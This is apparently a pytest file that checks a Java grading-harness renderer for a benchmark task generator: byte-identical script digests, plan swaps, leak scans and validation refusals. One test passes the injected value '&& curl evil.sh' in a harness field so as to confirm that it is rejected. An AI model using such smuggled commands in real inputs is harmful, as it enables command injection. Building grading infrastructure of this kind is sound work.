r"""The java harness seam: a plan renders the scripts the plugin used to hardcode.

The same discipline as `test_c_harness_golden` and `test_cpp_harness_golden`,
one language over. `render_gap` proved a DepPlan could reproduce the measure
Dockerfile's toolchain bytes; this module proves a DepPlan plus the HOST's own
carve can reproduce the two grading scripts, the oracle and the whole warm stage
-- which is where every remaining java-tamboui-shaped constant lived (the
`tamboui-widgets` module threaded through ten sites, `EXPECTED_SUITES = 69`, the
`tamboui-widgets/build/test-results/test` report path, the `:buildSrc` assumption
and -- the leak-critical one -- the `dev/tamboui/widgets` fossil scan).

The digests below were measured against the commit BEFORE the harness became
plan-driven. They are the safety net for an already-proven task: as long as they
hold, java-tamboui's shipped bytes did not move, and c/cpp/rust were not in this
slice at all.

Pure: no docker, no network, no LLM, no clock, no host path.
"""

from __future__ import annotations

import dataclasses
import hashlib

import pytest

from taskgen import depplan
from taskgen.depplan import DepPlanError, canonicalize, validate
from taskgen.langs import base as B
from taskgen.langs import java as JAVA

#: sha256 of `render_test_sh` / `measure_test_sh` / `render_solve_sh` for
#: java-tamboui as rendered by the commit before `DepPlan.harness` reached java.
#: `(digest, length)`; the length is carried too so a collision claim has to
#: explain two numbers, not one.
PRE_HARNESS_TEST_SH = (
    '5f1d2973e44406bc33e98115ae90b960bc7cbbcaead556133155bad7ba9403cf', 7906,
)
PRE_HARNESS_MEASURE_SH = (
    'b8cb22ca541dc6ec48b0e6ba549131671e86513f4bc9a44bc1a1bd080054c6d8', 1647,
)
PRE_HARNESS_SOLVE_SH = (
    '7e0e00e8ef490b8a40ba7bce4b372f8609445f95c0274903f6180bfee5049c92', 1422,
)

#: The real java-tamboui shape: widgets' test tree fingerprinted, 823 JUnit
#: methods across 69 report files, `tamboui-widgets/src/main/java` carved.
FINGERPRINT = {
    'tamboui-widgets/src/test/java/dev/tamboui/widgets/AlphaTest.java': 'a' * 64,
    'tamboui-widgets/src/test/java/dev/tamboui/widgets/BetaTest.java': 'b' * 64,
}
TEST_SUITES = 69
GRADED_MODULE = 'tamboui-widgets'
CARVED = ('tamboui-widgets/src/main/java/dev/tamboui/widgets/Button.java',)


@pytest.fixture
def plugin():
    return JAVA.JavaPlugin()


@pytest.fixture
def graded():
    return B.GradedSet(
        expected=823, floor_mode='equality', kind='whole-suite',
        test_command=JAVA.TEST_COMMAND, fingerprint_sha256=FINGERPRINT,
    )


def render_test_sh(plugin, graded, plan=None, **kwargs):
    kwargs.setdefault('test_suites', TEST_SUITES)
    kwargs.setdefault('graded_module', GRADED_MODULE)
    return plugin.render_test_sh(graded, dep_plan=plan, **kwargs)


def digest(text: str) -> tuple[str, int]:
    return hashlib.sha256(text.encode('utf-8')).hexdigest(), len(text)


# ------------------------------------------------------------- byte lock ----


def test_test_sh_hashes_to_its_pre_harness_digest(plugin, graded):
    """java-tamboui's verifier bytes did not move when the harness became plan-driven."""
    assert digest(render_test_sh(plugin, graded)) == PRE_HARNESS_TEST_SH


def test_measure_sh_hashes_to_its_pre_harness_digest(plugin, graded):
    assert digest(plugin.measure_test_sh(graded=graded)) == PRE_HARNESS_MEASURE_SH


def test_solve_sh_hashes_to_its_pre_harness_digest(plugin):
    """The oracle's post-restore wipe moved into the plan without moving a byte."""
    assert digest(plugin.render_solve_sh(CARVED)) == PRE_HARNESS_SOLVE_SH


def test_the_canonical_plan_renders_the_same_bytes_as_no_plan(plugin, graded):
    """The load-bearing one: passing java-tamboui's plan MOVED nothing.

    `dep_plan=None` is the pre-resolution path every older caller takes;
    `JAVA_MEASURE_DEP_PLAN` is that same environment written down. If the two
    ever diverged, the fallback would be a second, unreviewed definition of the
    java-tamboui harness rather than the same one under a name.
    """
    assert render_test_sh(plugin, graded, JAVA.JAVA_MEASURE_DEP_PLAN) == (
        render_test_sh(plugin, graded)
    )
    assert plugin.measure_test_sh(
        graded=graded, dep_plan=JAVA.JAVA_MEASURE_DEP_PLAN,
    ) == plugin.measure_test_sh(graded=graded)
    assert plugin.render_solve_sh(CARVED, dep_plan=JAVA.JAVA_MEASURE_DEP_PLAN) == (
        plugin.render_solve_sh(CARVED)
    )


def test_the_warm_stage_renders_the_same_bytes_from_the_plan_and_the_carve(plugin):
    """The dep-warm seam is additive too -- including the fossil scan's subject."""
    bare = B.EnvSpec(repo_name='java-tamboui')
    carved = B.EnvSpec(repo_name='java-tamboui', carve=JAVA.JAVA_TAMBOUI_CARVE)
    assert plugin.dep_warm_spec_for(
        carved, JAVA.JAVA_MEASURE_DEP_PLAN,
    ).stage_block == plugin.dep_warm_spec().stage_block
    assert plugin.pre_leakgate_blocks_for(carved, JAVA.JAVA_MEASURE_DEP_PLAN) == (
        plugin.pre_leakgate_blocks(bare)
    )


def test_render_is_deterministic(plugin, graded):
    assert render_test_sh(plugin, graded) == render_test_sh(plugin, graded)
    assert plugin.measure_test_sh(graded=graded) == plugin.measure_test_sh(graded=graded)


def test_the_test_command_is_derived_from_the_plan_not_respelled(plugin):
    """instruction.md's prose and the rendered argv are one statement, not two."""
    assert JAVA.TEST_COMMAND == (
        'gradle --offline --no-daemon --console=plain :tamboui-widgets:test --rerun'
    )
    assert plugin.test_command_from_plan(None) == JAVA.TEST_COMMAND
    assert plugin.test_command_from_plan(JAVA.JAVA_MEASURE_DEP_PLAN) == JAVA.TEST_COMMAND


def test_the_renderer_carries_no_java_tamboui_constant():
    """The point of the slice: java-the-language, not java-tamboui-the-repository.

    Scoped to the PLUGIN CLASS, which is everything that renders. The
    java-tamboui facts are still allowed to appear in `JAVA_TAMBOUI_HARNESS` and
    `JAVA_TAMBOUI_CARVE` (that repository's own plan and carve) and as `e.g.`
    illustrations inside the slot descriptions the resolver prompt is built
    from -- an example is what makes a model fill a slot right on attempt 1, and
    it reaches no rendered byte.
    """
    import inspect

    renderer = inspect.getsource(JAVA.JavaPlugin)
    for token in ('tamboui-widgets', 'dev/tamboui/widgets', 'dev.tamboui.widgets',
                  'buildSrc', 'widget', '69'):
        assert token not in renderer, (
            f'{token!r} is still hardcoded in the java renderer'
        )


# ------------------------------------------------------------- the seam -----


def _swapped_plan() -> depplan.DepPlan:
    """A DIFFERENT repo: single-project build, no buildSrc, its own report dir."""
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        test_invocation=(
            ('command', ('gradle', '--offline', '--no-daemon', ':test')),
        ),
        harness=(
            ('buildsrc_path', ''),
            ('project_label', 'demo'),
            ('results_dir', 'build/test-results/test'),
            ('stale_paths', ('build', '.gradle')),
            ('test_task', ':test'),
        ),
    )
    validate(plan)
    return canonicalize(plan)


_DEMO_CARVE = B.CarveFacts(
    root='src/main/java',
    package_roots=('com/example/demo',),
    file_count=12,
    grader_source_count=7,
)


def test_a_different_harness_renders_a_different_script(plugin, graded):
    """The seam is live, and it moves exactly the places it should."""
    plan = _swapped_plan()
    plugin.validate_dep_plan(plan)
    swapped = dataclasses.replace(
        graded, fingerprint_sha256={'src/test/java/com/example/demo/OneTest.java': 'd' * 64},
    )
    script = render_test_sh(
        plugin, swapped, plan, test_suites=7, graded_module='',
    )

    assert 'RESULTS=build/test-results/test' in script
    assert 'EXPECTED_SUITES=7' in script
    assert 'across 7 suites' in script
    assert '# src/test IS the grader.' in script
    assert 'gradle --offline --no-daemon :test > "${GRADLE_LOG}" 2>&1' in script
    assert '[ "${SUITES}" -eq "${EXPECTED_SUITES}" ] \\' in script

    for gone in ('tamboui', 'EXPECTED_SUITES=69', 'across 69 suites'):
        assert gone not in script, f'{gone!r} survived a harness swap'


def test_a_different_harness_renders_a_different_measure_script(plugin, graded):
    script = plugin.measure_test_sh(graded=graded, dep_plan=_swapped_plan())
    assert 'RESULTS=build/test-results/test' in script
    assert 'gradle --offline --no-daemon :test > "${MEASURE_LOG}"' in script
    assert 'tamboui' not in script
    assert 'measure "${TESTS}"' in script


def test_a_different_harness_renders_a_different_oracle(plugin):
    script = plugin.render_solve_sh(
        ('src/main/java/com/example/demo/Widget.java',), dep_plan=_swapped_plan(),
    )
    assert 'rm -rf "${REPO}/build" "${REPO}/.gradle"' in script
    assert 'tamboui-widgets' not in script


def test_a_repo_without_buildsrc_asserts_nothing_about_one(plugin):
    """A repo with no buildSrc must not trip an assert written for one that has it."""
    env = B.EnvSpec(repo_name='demo', carve=_DEMO_CARVE)
    block = plugin.dep_warm_spec_for(env, _swapped_plan()).stage_block

    assert 'buildSrc' not in block
    assert ':buildSrc:assemble' not in block
    assert 'Two passes matching the Oracle design' in block
    assert "#   1) harborResolveAll" in block
    assert "#   2) --stop kills the daemon" in block
    assert 'harborResolveAll; \\' in block


def test_the_leak_scan_follows_the_carved_package_root(plugin):
    """THE SILENT-LEAK FIX. The fossil scan's subject is the carve's, not tamboui's."""
    env = B.EnvSpec(repo_name='demo', carve=_DEMO_CARVE)
    block = plugin.dep_warm_spec_for(env, _swapped_plan()).stage_block

    assert "-path '*com/example/demo*' -print" in block
    assert 'holds com.example.demo artifacts:' in block
    assert 'carries no com.example.demo symbols or paths' in block
    assert 'find /opt/harbor/repo/src/main/java ' in block

    for gone in ('dev/tamboui/widgets', 'dev.tamboui.widgets', 'tamboui-widgets'):
        assert gone not in block, f'{gone!r} survived a carve swap -- vacuous scan'


def test_a_carve_with_no_package_root_is_refused_loudly(plugin):
    """A scan whose subject is unknown passes vacuously; it must never render."""
    env = B.EnvSpec(
        repo_name='demo', carve=B.CarveFacts(root='src/main/java', package_roots=()),
    )
    with pytest.raises(B.LangError, match='vacuously'):
        plugin.dep_warm_spec_for(env, _swapped_plan())


def test_several_carved_packages_are_or_ed_inside_parentheses(plugin):
    """`find -path A -o -path B -print` prints only B -- a leak would read clean."""
    env = B.EnvSpec(
        repo_name='demo',
        carve=B.CarveFacts(
            root='src/main/java', package_roots=('com/a', 'com/b'),
            file_count=2, grader_source_count=2,
        ),
    )
    block = plugin.dep_warm_spec_for(env, _swapped_plan()).stage_block
    assert "\\( -path '*com/a*' -o -path '*com/b*' \\) -print" in block
    assert 'holds com.a, com.b artifacts:' in block


def test_the_swapped_plan_still_validates_and_digests(plugin):
    plan = _swapped_plan()
    plugin.validate_dep_plan(plan)
    assert depplan.dep_plan_digest(plan) != (
        depplan.dep_plan_digest(JAVA.JAVA_MEASURE_DEP_PLAN)
    )


# ------------------------------------------- the under-enumeration guard ----


def test_the_suite_gate_is_baked_from_the_host_scan_not_a_constant(plugin, graded):
    """THE GUARD. A shrunken denominator is self-consistent at the wrong number.

    `EXPECTED_SUITES=69` used to be a literal in the plugin source. It is now
    whatever `emit._java_grader_metadata` counted in the INTACT tree, so the
    graded run has to reproduce an independently established number -- and a
    run in which JUnit failed to fan out every declared class still trips it.

    It is deliberately NOT a plan slot: the count depends on class structure
    inside the test files, and the resolver is shown test PATHS only, so a slot
    for it could only ever be guessed at.
    """
    assert 'EXPECTED_SUITES=69' in render_test_sh(plugin, graded)
    assert 'EXPECTED_SUITES=61' in render_test_sh(plugin, graded, test_suites=61)
    assert 'test_suites' not in dict(JAVA.JAVA_MEASURE_DEP_PLAN.harness)


def test_a_plan_that_grades_a_module_nobody_carved_is_refused(plugin, graded):
    """A results dir outside the carve counts a module whose sources are all there."""
    with pytest.raises(B.LangError, match='not inside the module the carve stubbed'):
        render_test_sh(plugin, graded, graded_module='tamboui-core')


def test_a_test_task_naming_another_module_is_refused(plugin, graded):
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        test_invocation=(
            ('command', ('gradle', '--offline', ':tamboui-core:test')),
        ),
        harness=tuple(
            (k, ':tamboui-core:test' if k == 'test_task' else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match='does not name the module the carve stubbed'):
        render_test_sh(plugin, graded, canonicalize(plan))


def test_render_test_sh_without_the_host_side_count_refuses(plugin, graded):
    with pytest.raises(B.LangError, match='test_suites and graded_module threaded'):
        plugin.render_test_sh(graded)


def test_the_host_side_scan_counts_junit_classes_including_nested(tmp_path):
    """The independent signal: a @Nested class is its own `TEST-*.xml`.

    The exact shape that made the count non-obvious on java-tamboui: 49 sources
    fan out into 69 reports because five outer classes declare no test method of
    their own and only their nested classes are reported.
    """
    from taskgen.emit import _java_grader_metadata, plan_carve

    repo = tmp_path / 'repo'
    main = repo / 'mod' / 'src' / 'main' / 'java' / 'com' / 'demo'
    test = repo / 'mod' / 'src' / 'test' / 'java' / 'com' / 'demo'
    main.mkdir(parents=True)
    test.mkdir(parents=True)
    (repo / 'settings.gradle.kts').write_text('include("mod")\n')
    (main / 'Widget.java').write_text('package com.demo;\npublic class Widget {}\n')
    (test / 'PlainTest.java').write_text(
        'package com.demo;\n'
        'class PlainTest {\n'
        '    @Test void a() { String s = "} @Test"; }\n'
        '    // @Test in a comment does not count\n'
        '}\n'
    )
    (test / 'OuterTest.java').write_text(
        'package com.demo;\n'
        'class OuterTest {\n'
        '    @Nested class First { @Test void a() {} }\n'
        '    @Nested class Second { @ParameterizedTest void b() {} }\n'
        '}\n'
    )
    (test / 'Helpers.java').write_text(
        'package com.demo;\nfinal class Helpers { static int x() { return 1; } }\n'
    )

    plan = plan_carve(
        repo, tmp_path / 'out', lang='java', carve_scope='folder',
        include=('mod/src/main/java/**',), delete_whole_file=True,
    )
    assert _java_grader_metadata(plan) == {
        'test_suites': 3, 'graded_module': 'mod',
    }


def test_a_test_method_on_an_abstract_class_refuses_to_be_counted(tmp_path):
    """The scan must never answer LOW. An inherited test runs once per subclass."""
    from taskgen.emit import _java_grader_metadata, plan_carve

    repo = tmp_path / 'repo'
    main = repo / 'src' / 'main' / 'java' / 'com' / 'demo'
    test = repo / 'src' / 'test' / 'java' / 'com' / 'demo'
    main.mkdir(parents=True)
    test.mkdir(parents=True)
    (repo / 'settings.gradle.kts').write_text('rootProject.name = "demo"\n')
    (main / 'Widget.java').write_text('package com.demo;\npublic class Widget {}\n')
    (test / 'BaseTest.java').write_text(
        'package com.demo;\nabstract class BaseTest { @Test void shared() {} }\n'
    )

    plan = plan_carve(
        repo, tmp_path / 'out', lang='java', carve_scope='folder',
        include=('src/main/java/**',), delete_whole_file=True,
    )
    with pytest.raises(B.LangError, match='abstract type'):
        _java_grader_metadata(plan)


def test_a_junit_suite_aggregation_refuses_to_be_counted(tmp_path):
    """@Suite re-runs classes it selects, so the report count is not declarative."""
    from taskgen.emit import _java_grader_metadata, plan_carve

    repo = tmp_path / 'repo'
    main = repo / 'src' / 'main' / 'java' / 'com' / 'demo'
    test = repo / 'src' / 'test' / 'java' / 'com' / 'demo'
    main.mkdir(parents=True)
    test.mkdir(parents=True)
    (repo / 'settings.gradle.kts').write_text('rootProject.name = "demo"\n')
    (main / 'Widget.java').write_text('package com.demo;\npublic class Widget {}\n')
    (test / 'AllTests.java').write_text(
        'package com.demo;\n@Suite\n@SelectClasses({OneTest.class})\nclass AllTests {}\n'
    )
    (test / 'OneTest.java').write_text(
        'package com.demo;\nclass OneTest { @Test void a() {} }\n'
    )

    plan = plan_carve(
        repo, tmp_path / 'out', lang='java', carve_scope='folder',
        include=('src/main/java/**',), delete_whole_file=True,
    )
    with pytest.raises(B.LangError, match='@Suite'):
        _java_grader_metadata(plan)


def test_the_scope_cross_check_reaches_the_refine_loop(tmp_path):
    """The guard has to fire where a plan can still be REPAIRED.

    `_candidate_validator` is what `_measure_and_pin` hands the refine loop, so
    a plan that grades a module nobody carved comes back as one more resolver
    attempt with a precise message -- not as an abort halfway through writing
    eleven entries.
    """
    from taskgen.emit import _candidate_validator, plan_carve

    repo = tmp_path / 'repo'
    main = repo / 'tamboui-widgets' / 'src' / 'main' / 'java' / 'dev' / 'tamboui' / 'widgets'
    test = repo / 'tamboui-widgets' / 'src' / 'test' / 'java' / 'dev' / 'tamboui' / 'widgets'
    main.mkdir(parents=True)
    test.mkdir(parents=True)
    (repo / 'settings.gradle.kts').write_text('include("tamboui-widgets")\n')
    (main / 'Widget.java').write_text('package dev.tamboui.widgets;\nclass Widget {}\n')
    (test / 'OneTest.java').write_text(
        'package dev.tamboui.widgets;\nclass OneTest { @Test void a() {} }\n'
    )

    plan = plan_carve(
        repo, tmp_path / 'out', lang='java', carve_scope='folder',
        include=('tamboui-widgets/src/main/java/**',), delete_whole_file=True,
    )
    validate_candidate = _candidate_validator(JAVA.JavaPlugin(), plan)
    mis_scoped = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        test_invocation=(('command', ('gradle', ':tamboui-core:test')),),
        harness=tuple(
            (k, ':tamboui-core:test' if k == 'test_task' else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match='does not name the module the carve stubbed'):
        validate_candidate(mis_scoped)


def test_a_carve_spanning_two_modules_is_refused(tmp_path):
    """One graded task, one report directory -- so one module, or nothing."""
    with pytest.raises(B.LangError, match='spans 2 modules'):
        JAVA.module_dir_of_carve((
            'a/src/main/java/com/x/A.java', 'b/src/main/java/com/x/B.java',
        ))


def test_a_carve_in_the_default_package_is_refused():
    """An empty namespace matches the whole cache and proves nothing."""
    with pytest.raises(B.LangError, match='default package'):
        JAVA.package_roots_of_carve(('src/main/java/A.java',))


def test_the_package_root_is_the_common_prefix_of_the_carve():
    assert JAVA.package_roots_of_carve((
        'm/src/main/java/dev/tamboui/widgets/Button.java',
        'm/src/main/java/dev/tamboui/widgets/tabs/Tab.java',
    )) == ('dev/tamboui/widgets',)


# ----------------------------------------------------------- refusals -------


@pytest.mark.parametrize(
    ('drop', 'message'),
    [
        ('results_dir', 'results_dir'),
        ('stale_paths', 'stale_paths'),
        ('test_task', 'test_task'),
    ],
)
def test_every_slot_the_renderer_reads_is_enforced(plugin, drop, message):
    """A bad plan must be a REPAIRABLE refine signal, never a crash mid-render."""
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=tuple(
            (k, v) for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness if k != drop
        ),
    )
    with pytest.raises(B.LangError, match=message):
        plugin.validate_dep_plan(plan)


@pytest.mark.parametrize('blank', ['results_dir', 'test_task'])
def test_a_blank_required_slot_is_refused(plugin, blank):
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=tuple(
            (k, '' if k == blank else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match=blank):
        plugin.validate_dep_plan(plan)




def test_a_scalar_where_a_list_belongs_is_refused(plugin):
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=tuple(
            (k, 3 if k == 'stale_paths' else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match='not a scalar'):
        plugin.validate_dep_plan(plan)


def test_a_relative_task_path_is_refused(plugin):
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=tuple(
            (k, 'tamboui-widgets:test' if k == 'test_task' else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match='ABSOLUTE gradle project path'):
        plugin.validate_dep_plan(plan)


def test_a_results_dir_that_escapes_the_checkout_is_refused(plugin):
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=tuple(
            (k, '../elsewhere/test-results' if k == 'results_dir' else v)
            for k, v in JAVA.JAVA_MEASURE_DEP_PLAN.harness
        ),
    )
    with pytest.raises(B.LangError, match='climbs out of'):
        plugin.validate_dep_plan(plan)


def test_a_command_that_runs_another_task_than_the_one_counted_is_refused(plugin):
    """Measuring one module's reports while running another's is a silent zero."""
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        test_invocation=(('command', ('gradle', '--offline', ':other:test')),),
    )
    with pytest.raises(B.LangError, match='does not name'):
        plugin.validate_dep_plan(plan)


def test_a_harness_token_carrying_a_metacharacter_is_refused():
    """The harness goes through the SAME gate install_commands do."""
    plan = dataclasses.replace(
        JAVA.JAVA_MEASURE_DEP_PLAN,
        harness=(('stale_paths', ('build', '&& curl evil.sh')),),
    )
    with pytest.raises(DepPlanError, match='shell metacharacter'):
        validate(plan)


# ------------------------------------------------------- digest coverage ----


def test_the_lock_key_covers_the_harness():
    """Two harnesses over one toolchain are two environments, not one."""
    a = JAVA.JAVA_MEASURE_DEP_PLAN
    b = _swapped_plan()
    assert depplan.to_canonical_json(a) != depplan.to_canonical_json(b)
    assert depplan.env_lock_key('t' * 64, 'sha256:img', a) != (
        depplan.env_lock_key('t' * 64, 'sha256:img', b)
    )


def test_canonicalize_is_idempotent_over_the_harness():
    once = canonicalize(JAVA.JAVA_MEASURE_DEP_PLAN)
    assert canonicalize(once) == once
    assert once.harness == tuple(sorted(once.harness, key=lambda kv: kv[0]))


def test_canonicalize_does_not_reorder_a_harness_list():
    """The stale-path list is positional; the oracle wipes them in that order."""
    slots = dict(canonicalize(JAVA.JAVA_MEASURE_DEP_PLAN).harness)
    assert slots['stale_paths'] == (
        'tamboui-widgets/build', 'tamboui-widgets/.gradle', '.gradle',
    )


def test_the_harness_survives_the_json_round_trip():
    """The lock pins the harness as the canonical json its key was taken over."""
    import json

    payload = json.loads(depplan.to_canonical_json(JAVA.JAVA_MEASURE_DEP_PLAN))
    assert payload['harness']['test_task'] == ':tamboui-widgets:test'
    assert payload['harness']['results_dir'] == (
        'tamboui-widgets/build/test-results/test'
    )
    assert payload['harness']['stale_paths'] == [
        'tamboui-widgets/build', 'tamboui-widgets/.gradle', '.gradle',
    ]


def test_the_fingerprint_globs_narrow_to_the_carved_module(plugin):
    """A monorepo's other modules keep their own test trees out of the lock."""
    assert plugin.grader_fingerprint_globs_for(CARVED) == (
        'tamboui-widgets/src/test/**',
    )
    assert plugin.grader_fingerprint_globs_for(
        ('src/main/java/com/demo/A.java',),
    ) == ('src/test/**',)
